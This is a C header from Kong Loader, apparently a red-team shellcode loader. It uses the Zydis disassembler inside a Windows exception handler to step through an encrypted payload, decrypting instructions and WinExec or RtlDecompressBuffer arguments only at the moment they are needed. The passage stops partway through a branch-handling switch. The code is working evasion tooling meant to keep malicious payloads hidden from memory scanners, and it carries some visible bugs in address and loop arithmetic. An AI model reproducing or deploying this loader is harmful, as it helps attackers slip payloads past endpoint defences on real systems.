#pragma once

/**
 * Mozilla Public License (MPL) Version 2.0.
 * 
 * Copyright (c) 2024 Tijme Gommers (@tijme).
 * 
 * This source code file is part of Kong Loader. Kong Loader is 
 * licensed under Mozilla Public License (MPL) Version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Integers.
 * 
 * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
 * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
 */
#include <stdint.h>

/**
 * String Handling.
 * 
 * Declares one type, several macros, and various functions for manipulating arrays of characters (strings).
 * https://learn.microsoft.com/en-us/cpp/standard-library/string?view=msvc-170
 */
#include <string.h>


/**
 * Debugging Help Library.
 * 
 * Provides functions for symbol and image handling, debugging support, and stack walking.
 * https://learn.microsoft.com/en-us/windows/win32/api/dbghelp/
 */
#include <dbghelp.h>

/**
 * Include Zydis.
 * 
 * Fast and lightweight x86/x86-64 disassembler and code generation library.
 * https://github.com/zyantific/zydis
 */
#include <Zydis/Zydis.h>

/**
 * Enum describing the type of size of a specific Windows API function argument.
 */
enum KnownFunctionArgumentSizeType {
    ARG_SIZE_TYPE_STRING, // The size is calculated based on the first null byte.
    ARG_SIZE_TYPE_IN_ARG, // The size is given as another argument (in register or on stack).
    ARG_SIZE_TYPE_IGNORE // Unknown
};

/**
 * Struct describing metadata of a specific Windows API function argument (specifically pointer lengths).
 */
struct KnownFunctionArgument {
    uint8_t bArgumentIndex;
    enum KnownFunctionArgumentSizeType eSizeType;
    union {
        struct {
            uint8_t bArgumentIndex;
        } InArg;
    };
};

/**
 * Struct describing a known Windows API function, and metadata belonging to it.
 */
struct KnownFunction {
    char* lpFunctionName;
    bool bShouldSetNextAddressOutsideBoundsActions;
    uint32_t dwArgumentCount;
    struct KnownFunctionArgument sArguments[6];
};

/**
 * Global variables
 */
#define KNOWN_FUNCTIONS_SIZE 4
static struct KnownFunction sKnownFunctions[KNOWN_FUNCTIONS_SIZE] = {
    {  "GetVersion", false, 0, { } },
    { "ZwQueryVirtualMemory", false, 6, { } },
    { 
        "WinExec", true, 2,
        {
            { 0, ARG_SIZE_TYPE_STRING },
            { 1, ARG_SIZE_TYPE_IGNORE },
        }
    },
    { 
        "RtlDecompressBuffer", 
        true, 
        6,
        {
            { 0, ARG_SIZE_TYPE_IGNORE },
            { 1, ARG_SIZE_TYPE_IGNORE },
            { 2, ARG_SIZE_TYPE_IGNORE },
            { 3, ARG_SIZE_TYPE_IN_ARG, { 4 } },
            { 4, ARG_SIZE_TYPE_IGNORE },
            { 5, ARG_SIZE_TYPE_IGNORE }
        } 
    }
};

/**
 * Print a specific instruction to the console as human readable assembly instruction
 * 
 * @param ZydisDecodedInstruction* zdInstruction The instruction to print.
 * @param ZydisDecodedOperand* zdOperands The operands in the zdInstruction->
 * @param uint8_t* lpCurrentAddress The current address of the zdInstruction->
 */
void PrintInstructionInformation(ZydisDecodedInstruction* zdInstruction, ZydisDecodedOperand* zdOperands, uint8_t* lpCurrentAddress) {
    // Initialize buffer on the stack
    char lpBuffer[256];

    // Format the binary instruction structure to human readable format
    ZydisFormatterFormatInstruction(
        lpZydisFormatter, 
        zdInstruction, 
        (ZydisDecodedOperand*) zdOperands, 
        zdInstruction->operand_count_visible, 
        lpBuffer, 
        sizeof(lpBuffer), 
        (ZyanU64) lpCurrentAddress, 
        NULL
    );

    // Print the result
    PRINT_VERBOSE("(R)VA 0x%.8X / 0x%p starts with 0x%X: %s", lpCurrentAddress - lpPD.lpPayload, lpCurrentAddress, *lpCurrentAddress, lpBuffer);
}

/**
 * Retrieve the name of a function given its address.
 * 
 * @param uint8_t* lpAddress The address of the function whose name is to be retrieved.
 * @return char* A dynamically allocated string containing the function name.
 */
char* GetFunctionNameFromAddress(uint8_t* lpAddress) {
    HANDLE hProcess = GetCurrentProcess();

    // Initialize symbol handler
    if (!SymInitialize(hProcess, NULL, TRUE)) {
        PRINT_WARNING("SymInitialize failedin GetFunctionNameFromAddress: 0x%X.", GetLastError());
        return "_unknown_";
    }

    // Set options for the symbol handler:
    // - SYMOPT_UNDNAME: Ensures that C++ function names are undecorated, making them more human-readable.
    // - SYMOPT_DEFERRED_LOADS: Defers the loading of symbols until they are actually needed.
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);

    // Create a buffer to hold the symbol information
    BYTE bSymbolBuffer[sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(TCHAR)];
    PSYMBOL_INFO lpSymbol = (PSYMBOL_INFO) bSymbolBuffer;
    lpSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    lpSymbol->MaxNameLen = MAX_SYM_NAME;

    // Get symbol information for the provided address
    DWORD64 dqDisplacement = 0;
    if (!SymFromAddr(hProcess, (DWORD64) lpAddress, &dqDisplacement, lpSymbol)) {
        PRINT_WARNING("SymFromAddr failed for 0x%p in GetFunctionNameFromAddress: 0x%X.", lpAddress, GetLastError());
        SymCleanup(hProcess);
        return "_unknown_"; 
    }

    // Allocate memory for the function name
    char* lpFunctionName = (char*) malloc(lpSymbol->NameLen + 1);
    if (!lpFunctionName) {
        PRINT_WARNING("Malloc failed for 0x%p in GetFunctionNameFromAddress: 0x%X.", lpAddress, GetLastError());
        SymCleanup(hProcess);
        return "_unknown_";
    }

    strcpy_s(lpFunctionName, lpSymbol->NameLen + 1, lpSymbol->Name);
    SymCleanup(hProcess);

    return lpFunctionName;
}

/**
 * Get dereferenced memory address and size of the given operand. The example below
 * are visualizations of how this calculation might take place:
 * 
 * - mov register, [base + (index * scale) + displacement]
 * - mov rax, [ebx + (esi * 4) + 8]
 * - mov rdx, [rsp + (rbp * 2)]
 * - mov r8, [esi + 8]
 * - mov rcx, [rax]
 * 
 * @param ZydisDecodedOperand zdOperand The operand of which we want to get the dereferenced memory address.
 * @param PEXCEPTION_POINTERS lpException The exception caught by the vectored exception handler, which holds information about e.g. register values.
 * @param uint8_t** lpAddress Output for the dereferenced memory address.
 * @param size_t* dwSize Output for the dereferenced memory size.
 */
void GetDereferencedMemory(ZydisDecodedOperand zdOperand, PEXCEPTION_POINTERS lpException, uint8_t** lpAddress, size_t* dwSize) {
    // The start address is always the displacement (usually zero)
    // mov rax, [... + 8]
    ZyanU64 zdOperandAddress = zdOperand.mem.disp.value;
    
    // Then we add the base address
    // mov rax, [r8 ...]
    if (zdOperand.mem.base != ZYDIS_REGISTER_NONE) {
        zdOperandAddress += (ZyanU64) getCpuRegisterValue(lpException->ContextRecord, zdOperand.mem.base);
    }

    // Then we add the base times scale
    // mov rax, [... (esi * 4) ...]
    if (zdOperand.mem.index != ZYDIS_REGISTER_NONE) {
        zdOperandAddress += ((ZyanU64) getCpuRegisterValue(lpException->ContextRecord, zdOperand.mem.base)) * zdOperand.mem.scale;
    }

    // Write results to output
    *lpAddress = (uint8_t*) zdOperandAddress;
    *dwSize = (size_t) (zdOperand.size  / 8);
}

/**
 * Check whether the given function address/name is in our known functions array.
 * 
 * @param uint8_t* lpFunctionAddress The address of the function to check.
 * @param char* lpFunctionName The name of the function to check.
 * @return bool Positive if we've defined it in our known functions array.
 */
bool IsKnownFunctionDefinition(uint8_t* lpFunctionAddress, char* lpFunctionName) {
    for (size_t i = 0; i < KNOWN_FUNCTIONS_SIZE; i++) {
        if (strcmp(sKnownFunctions[i].lpFunctionName, lpFunctionName) == 0) {
            return true;
        }
    }

    return false;
}

/**
 * Calculate the size of a byte sequence at a given address (originating from a certain registry key) based on the function definition.
 * 
 * @param ZydisDecodedInstruction* zdInstruction The decoded instruction that can be used to enrich data.
 * @param ZydisDecodedOperand* zdOperands The operands in the decoded instruction that can be used to enrich data.
 * @param PEXCEPTION_POINTERS lpException The exception caught by the vectored exception handler, which holds information about e.g. register values.
 * @param uint8_t* lpCurrentAddress The current address of the zdInstruction.
 * @param ZydisRegister zdRegister The specific register holding a memory address that we need to get the size for.
 * @param uint8_t* lpRegisterAddress The address in the registry to calculate the byte sequence size for.
 * @param char* lpFunctionName The name of the function to check.
 * @return uint64_t The exact size of a certain argument (pointer type) based in its known function definition.
 */
uint64_t GetSizeOfByteSequenceFromKnownFunctionDefinition(ZydisDecodedInstruction* zdInstruction, ZydisDecodedOperand* zdOperands, PEXCEPTION_POINTERS lpException, uint8_t* lpCurrentAddress, ZydisRegister zdRegister, uint8_t* lpRegisterAddress, char* lpFunctionName) {
    uint64_t qwSizeToReturn = 0;
    uint32_t dwOffset = lpRegisterAddress - lpPD.lpPayload;
    PCONTEXT lpContext = lpException->ContextRecord;
    uint32_t dwRegisterIndex = getCCArgumentIndexFromRegister(zdRegister);

    for (size_t i = 0; i < sizeof(sKnownFunctions); i++) {
        if (strcmp(sKnownFunctions[i].lpFunctionName, lpFunctionName) == 0) {
            switch (sKnownFunctions[i].sArguments[dwRegisterIndex].eSizeType) {
                case ARG_SIZE_TYPE_IN_ARG:
                    if (sKnownFunctions[i].sArguments[dwRegisterIndex].InArg.bArgumentIndex < 4) {
                        // In register
                        ZydisRegister zdRegisterToRetrieve = getCCRegisterFromArgumentIndex(sKnownFunctions[i].sArguments[dwRegisterIndex].InArg.bArgumentIndex);
                        return (uint64_t) getCpuRegisterValue(lpContext, zdRegisterToRetrieve);
                    } else {
                        // On stack
                        uint64_t* lpStackPointer = (uint64_t*) getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RSP);
                        uint32_t bStackIndex = (sKnownFunctions[i].sArguments[dwRegisterIndex].InArg.bArgumentIndex - 4);
                        return (uint64_t) *(lpStackPointer + bStackIndex);
                    }
                    break;
                case ARG_SIZE_TYPE_STRING:
                    ZydisRegister zdRegisterToRetrieve = getCCRegisterFromArgumentIndex(dwRegisterIndex);
                    uint8_t* lpString = (uint8_t*) getCpuRegisterValue(lpContext, zdRegisterToRetrieve);
                    return GetEncryptedStringLength(&lpPD, lpString - lpPD.lpPayload) + 1; // Add 1 for null terminator
                    break;
            }
        }
    }

    // Unknown, decrypt until known instruction or end of payload
    for (uint32_t i = dwOffset; i < lpPD.dwPayloadSize; i ++) {
        if (!lpPD.lpBDL[dwOffset].bIsEncrypted) break;
        if (lpPD.lpBDL[dwOffset].eByteType == BYTE_TYPE_PART_OF_INSTRUCTION) break;

        qwSizeToReturn ++;
    }

    return qwSizeToReturn;
}

/**
 * Check whether decryption actions should be set for the next instruction to work.
 * 
 * @param ZydisDecodedInstruction* zdInstruction The decoded instruction that can be used to enrich data.
 * @param ZydisDecodedOperand* zdOperands The operands in the decoded instruction that can be used to enrich data.
 * @param PEXCEPTION_POINTERS lpException The exception caught by the vectored exception handler, which holds information about e.g. register values.
 * @param uint8_t* lpCurrentAddress The current address of the zdInstruction.
 * @param uint8_t* lpRegisterAddress The address in the registry to calculate the byte sequence size for.
 * @return bool Positive if the next instruction is out of bounds and some data within bounds should be decrypted.
 */
bool ShouldSetNextAddressOutsideBoundsActions(ZydisDecodedInstruction* zdInstruction, ZydisDecodedOperand* zdOperands, PEXCEPTION_POINTERS lpException, uint8_t* lpCurrentAddress, uint8_t* lpRegisterAddress) {
    struct ByteDescriptor* lpCurrentBD = &lpPD.lpBDL[lpCurrentAddress - lpPD.lpPayload];

    if (lpCurrentBD->lpLastKnownNextAddress == NULL) {
        return false;
    }

    if (IsAddressWithinBounds(&lpPD, lpCurrentBD->lpLastKnownNextAddress)) {
        return false;
    }

    char* lpFunctionName = GetFunctionNameFromAddress(lpRegisterAddress);
    for (size_t i = 0; i < KNOWN_FUNCTIONS_SIZE; i++) {
        if (strcmp(sKnownFunctions[i].lpFunctionName, lpFunctionName) == 0) {
            return sKnownFunctions[i].bShouldSetNextAddressOutsideBoundsActions;
        }
    }

    return true;
}

/**
 * Calculate the size of a byte sequence at a given address (originating from a certain register) on best effort basis.
 * 
 * @param ZydisDecodedInstruction* zdInstruction The decoded instruction that can be used to enrich data.
 * @param ZydisDecodedOperand* zdOperands The operands in the decoded instruction that can be used to enrich data.
 * @param PEXCEPTION_POINTERS lpException The exception caught by the vectored exception handler, which holds information about e.g. register values.
 * @param uint8_t* lpCurrentAddress The current address of the zdInstruction.
 * @param ZydisRegister zdRegister The specific register holding a memory address that we need to get the size for.
 * @param uint8_t* lpRegisterAddress The address in the register to calculate the byte sequence size for.
 */
uint64_t GetBestEffortSizeOfByteSequence(ZydisDecodedInstruction* zdInstruction, ZydisDecodedOperand* zdOperands, PEXCEPTION_POINTERS lpException, uint8_t* lpCurrentAddress, ZydisRegister zdRegister, uint8_t* lpRegisterAddress) {
    struct ByteDescriptor* lpCurrentBD = &lpPD.lpBDL[lpCurrentAddress - lpPD.lpPayload];
    char* lpFunctionName = GetFunctionNameFromAddress(lpCurrentBD->lpLastKnownNextAddress);
    uint64_t qwSizeToReturn = 0;

    if (IsKnownFunctionDefinition(lpRegisterAddress, lpFunctionName)) {
        qwSizeToReturn = GetSizeOfByteSequenceFromKnownFunctionDefinition(zdInstruction, zdOperands, lpException, lpCurrentAddress, zdRegister, lpRegisterAddress, lpFunctionName);
        goto RETURN_RESULT;
    }

    // Unknown, decrypt until known instruction or end of payload
    uint32_t dwOffset = lpRegisterAddress - lpPD.lpPayload;
    for (uint32_t i = dwOffset; i < lpPD.dwPayloadSize; i ++) {
        if (!lpPD.lpBDL[dwOffset].bIsEncrypted) break;
        if (lpPD.lpBDL[dwOffset].eByteType == BYTE_TYPE_PART_OF_INSTRUCTION) break;

        qwSizeToReturn ++;
    }

RETURN_RESULT:
    PRINT_VERBOSE("GetBestEffortSizeOfByteSequence of %s located at 0x%p resulted in: %d.", lpFunctionName, lpCurrentBD->lpLastKnownNextAddress, qwSizeToReturn);
    return qwSizeToReturn;
}

/**
 * Configure data at the memory addresses of RCX, RDX, R8 and R9 to be decrypted (on best-effort practice).
 * For example, if there's a call to WinExec(rcx, rdx), where rcx is an address in our memory range, we want
 * to decrypt it before running WinExec.
 * 
 * TODO: Add support for stack addresses for known windows API calls
 * 
 * @param ZydisDecodedInstruction* zdInstruction The decoded instruction that can be used to enrich data.
 * @param ZydisDecodedOperand* zdOperands The operands in the decoded instruction that can be used to enrich data.
 * @param PEXCEPTION_POINTERS lpException The exception caught by the vectored exception handler, which holds information about e.g. register values.
 * @param uint8_t* lpCurrentAddress The current address of the zdInstruction.
 */
void SetNextAddressOutsideBoundsActions(ZydisDecodedInstruction* zdInstruction, ZydisDecodedOperand* zdOperands, PEXCEPTION_POINTERS lpException, uint8_t* lpCurrentAddress) {
    // Define commonly used variables
    PCONTEXT lpContext = lpException->ContextRecord;
    struct ByteDescriptor* lpCurrentBD = &lpPD.lpBDL[lpCurrentAddress - lpPD.lpPayload];

    // Create decrypt actions for X64 calling convention registers
    ZydisRegister zdKeysToDecrypt[4] = { ZYDIS_REGISTER_RCX, ZYDIS_REGISTER_RDX, ZYDIS_REGISTER_R8, ZYDIS_REGISTER_R9 };
    for (size_t i = 0; i < (sizeof(zdKeysToDecrypt) / sizeof(ZydisRegister)); i++) {
        uint8_t* lpRegisterAddress = (uint8_t*) getCpuRegisterValue(lpContext, zdKeysToDecrypt[i]);
        if (IsAddressWithinBounds(&lpPD, lpRegisterAddress)) {
            lpCurrentBD->sInstructionActions[i].eDesiredState = DESIRED_STATE_DECRYPTED;
            lpCurrentBD->sInstructionActions[i].lpAddress = lpRegisterAddress;
            lpCurrentBD->sInstructionActions[i].dwSize = GetBestEffortSizeOfByteSequence(zdInstruction, zdOperands, lpException, lpCurrentAddress, zdKeysToDecrypt[i], lpRegisterAddress);
        } else {
            lpCurrentBD->sInstructionActions[i].eDesiredState = DESIRED_STATE_UNDEFINED;
        }
    }
}

/**
 * Enrich the byte descriptor of the current address with:
 * - lpLastKnownNextAddress
 * - lpLastKnownNextBreakpointAddress
 * 
 * TODO: Set lpLastKnownNextAddress (for all remaining types)
 * 
 * @param ZydisDecodedInstruction* zdInstruction The decoded instruction that can be used to enrich data.
 * @param ZydisDecodedOperand* zdOperands The operands in the decoded instruction that can be used to enrich data.
 * @param PEXCEPTION_POINTERS lpException The exception caught by the vectored exception handler, which holds information about e.g. register values.
 * @param uint8_t* lpCurrentAddress The current address of the zdInstruction.
 */
void EnrichByteDescriptor(ZydisDecodedInstruction* zdInstruction, ZydisDecodedOperand* zdOperands, PEXCEPTION_POINTERS lpException, uint8_t* lpCurrentAddress) {
    // Define commonly used variables
    PCONTEXT lpContext = lpException->ContextRecord;
    struct ByteDescriptor* lpCurrentBD = &lpPD.lpBDL[lpCurrentAddress - lpPD.lpPayload];
    ZydisDecodedOperand zdFirstOperand = zdOperands[0];

    // If we cannot calculate the last known values, set them to NULL.
    // As our last 'known' value would then be empty.
    lpCurrentBD->lpLastKnownNextAddress = NULL;
    lpCurrentBD->lpLastKnownNextBreakpointAddress = NULL;

    // Our desired state of all actions of this instruction is set to undefined as well.
    for (size_t i = 0; i < MAX_INSTRUCTION_ACTIONS_PER_BYTE; i++) {
        lpCurrentBD->sInstructionActions[i].eDesiredState = DESIRED_STATE_UNDEFINED;
    }

    switch (zdInstruction->mnemonic) {

        /**
         * Return
         */
        case ZYDIS_MNEMONIC_RET:
            lpCurrentBD->lpLastKnownNextBreakpointAddress = (uint8_t*) *(uintptr_t*) lpContext->Rsp;

            break;
        
        /**
         * Syscall
         */ 
        case ZYDIS_MNEMONIC_SYSCALL:
            PRINT_FAILURE_AND_ABORT("Syscalls have not yet been implemented");
            break;
        
        /**
         * Call
         * 
         * - CALL 0x1 (short, likely within our bounds)
         * - CALL reg (far, likely outside our bounds)
         */ 
        case ZYDIS_MNEMONIC_CALL:
            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_IMMEDIATE) { 
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
                lpCurrentBD->lpLastKnownNextAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
                goto ZYDIS_MNEMONIC_CALL_BREAK;
            }

            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_REGISTER && !IsAddressWithinBounds(&lpPD, (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value))) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
                lpCurrentBD->lpLastKnownNextAddress = (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value);
                goto ZYDIS_MNEMONIC_CALL_BREAK;
            }

            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_REGISTER && IsAddressWithinBounds(&lpPD, (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value))) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value);
                lpCurrentBD->lpLastKnownNextAddress = (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value);
                goto ZYDIS_MNEMONIC_CALL_BREAK;
            }

            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_MEMORY) {
                uint64_t base = zdFirstOperand.mem.base != ZYDIS_REGISTER_NONE ? getCpuRegisterValue(lpContext, zdFirstOperand.mem.base) : 0;
                uint64_t index = zdFirstOperand.mem.index != ZYDIS_REGISTER_NONE ? getCpuRegisterValue(lpContext, zdFirstOperand.mem.index) : 0;
                uint8_t* targetAddress = (uint8_t*) (base + (index * zdFirstOperand.mem.scale) + zdFirstOperand.mem.disp.value);
                
                if (!IsAddressWithinBounds(&lpPD, targetAddress)) {
                    lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
                    lpCurrentBD->lpLastKnownNextAddress = targetAddress;
                } else {
                    lpCurrentBD->lpLastKnownNextBreakpointAddress = targetAddress;
                    lpCurrentBD->lpLastKnownNextAddress = targetAddress;
                }
                goto ZYDIS_MNEMONIC_CALL_BREAK;
            }

            // Fail or break
            PRINT_FAILURE_AND_ABORT("Unknown operand type in call 0x%X", zdFirstOperand.type);
            ZYDIS_MNEMONIC_CALL_BREAK: break;

        /**
         * Jump
         * 
         * - JMP 0x1 (short, likely within our bounds)
         * - JMP reg (far, likely outside our bounds)
         */
        case ZYDIS_MNEMONIC_JMP:
            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_IMMEDIATE) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
                lpCurrentBD->lpLastKnownNextAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
                goto ZYDIS_MNEMONIC_JMP_BREAK;
            }

            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_REGISTER && !IsAddressWithinBounds(&lpPD, (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value))) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = (uint8_t*) *(uintptr_t*) lpContext->Rsp;
                lpCurrentBD->lpLastKnownNextAddress = (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value);
                goto ZYDIS_MNEMONIC_JMP_BREAK;
            }

            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_REGISTER && IsAddressWithinBounds(&lpPD, (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value))) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value);
                lpCurrentBD->lpLastKnownNextAddress = (uint8_t*) getCpuRegisterValue(lpContext, zdFirstOperand.reg.value);
                goto ZYDIS_MNEMONIC_JMP_BREAK;
            }

            // Fail or break
            PRINT_FAILURE_AND_ABORT("Unknown operand type in jmp 0x%X", zdFirstOperand.type);
            ZYDIS_MNEMONIC_JMP_BREAK: break;

        /**
         * Jump if sign
         * 
         * - JS 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JS:
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_SF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump if not sign
         * 
         * - JNS 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JNS:
            if (!getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_SF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }
            break;

        /**
         * Jump if zero
         * 
         * - JZ 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JZ:
        // case ZYDIS_MNEMONIC_JE: (alias, but does not exist in Zydis)
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump if not zero
         * 
         * - JNZ 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JNZ:
            if (!getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump if less
         * 
         * - JL 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JL:
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_SF) != getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_OF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump if less or equal
         * 
         * - JLE 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JLE:
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF) || (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_SF) != getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_OF))) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }
            break;

        /**
         * Jump if less or equal
         * 
         * - JLE 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JNLE:
            if (!getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF) && (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_SF) == getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_OF))) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }
            break;

        /**
         * Jump if not less
         * 
         * - JNL 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JNL:
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_SF) == getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_OF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump near if below or equal
         * 
         * - JBE 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JBE:
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_CF) || getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump near if not below or equal
         * 
         * - JNBE 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JNBE:
            if (!getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_CF) && !getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }
            
            break;

        /**
         * Jump near if below 
         * 
         * - JBE 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JB:
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_CF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump near if not below
         * 
         * - JNB 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JNB:
            // case ZYDIS_MNEMONIC_JAE: (alias, but does not exist in Zydis)
            if (!getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_CF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump if overflow
         * 
         * - JO 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JO:
            if (getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_OF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Jump if not overflow
         * 
         * - JNO 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JNO:
            if (!getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_OF)) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }
            break;

        /**
         * Jump short if RCX
         * 
